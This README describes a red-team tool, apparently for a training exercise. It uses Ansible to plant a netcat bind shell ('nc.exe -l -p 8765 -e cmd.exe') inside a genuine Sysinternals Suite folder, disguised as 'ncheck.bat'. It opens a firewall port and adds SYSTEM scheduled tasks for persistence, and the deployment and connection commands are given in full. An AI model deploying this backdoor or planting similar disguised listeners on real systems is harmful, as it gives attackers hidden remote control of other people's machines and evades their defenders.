# Sysintbind
Author: Lucas Brown

Red team tool that deploys a **bind shell** on Windows by dropping it inside a legitimate **Sysinternals Suite** install. The listener is named **ncheck.bat** so it looks like a normal “check” utility alongside real Sysinternals tools.

## What the tool does

1. Creates `C:\tools` and `C:\tools\SysinternalsSuite` on each target.
2. Downloads the official Microsoft Sysinternals Suite zip and extracts it into that folder.
3. Downloads netcat for Windows, extracts **nc.exe** into the same folder.
4. Copies **ncheck.bat** (the bind shell script) into the folder.
5. Ensures a Windows Firewall rule exists to allow inbound **TCP 8765** to the listener.
6. Copies **scheck.bat** (scheduled check installer) into the same folder.
7. Runs **scheck.bat**, which creates two scheduled tasks under **SYSTEM**:
   - `scheck-startup` – runs `ncheck.bat` on system startup.
   - `scheck-10min` – runs `ncheck.bat` every 10 minutes.
8. Starts **ncheck.bat** in the background so it listens on **TCP 8765** and runs `cmd.exe` for any connecting client.

After deployment you get a `cmd.exe` shell by connecting to the target on port 8765 (e.g. `nc <target_ip> 8765`).


## File reference
- **playbook.yml**: Ansible playbook. Creates dirs, downloads Sysinternals & netcat zips, extracts them, copies ncheck.bat, then starts ncheck.bat in the background. Targets the `windows` group. 
- **vars.yml**: Variables: Sysinternals zip URL, netcat zip URL, `C:\tools` path, and install path `C:\tools\SysinternalsSuite`. Override these if you need different URLs or paths. 
- **hosts.ini**: Minimal inventory for one or more Windows hosts with WinRM connection settings. Edit `ansible_host`, `ansible_user`, `ansible_password`, and (optionally) `ansible_port` if not using 5986. 
- **ncheck.bat**: Batch file deployed to the Sysinternals folder. On run it re-launches itself minimized, adds a Windows Firewall rule (`ncheck-8765`) to allow inbound TCP 8765 if needed, then runs `nc.exe -l -p 8765 -e cmd.exe` so the folder acts as a bind shell. Uses `%~dp0nc.exe` so it works regardless of install path. 
- **scheck.bat**: “scheduled check” helper that creates two scheduled tasks (`scheck-startup`, `scheck-10min`) so `ncheck.bat` is launched on startup and every 10 minutes under SYSTEM.

## How to deploy

### Prerequisites

- Ansible with Windows support: `ansible-galaxy collection install ansible.windows`, and `pip install pywinrm` for WinRM.
- Target Windows machines (e.g. Server 2022) with **WinRM** enabled and reachable (typically port 5985 or 5986 for HTTPS).

### Steps

1. Edit `hosts.ini`  
   Set `ansible_user` and `ansible_password` (and `ansible_host` per host if your IPs differ). Default port is 5986 (WinRM HTTPS); use 5985 for HTTP.

2. Run the playbook from this directory  
```sh
ansible-playbook playbook.yml -i hosts.ini
```  
To limit to specific hosts:
```sh
ansible-playbook playbook.yml -i hosts.ini --limit armory-bt1,sewers-bt1
```

3. Connect to the bind shell  
From your attack host:
```sh
nc -v <target_ip> 8765
```  
You should get a `cmd.exe` prompt on the target.
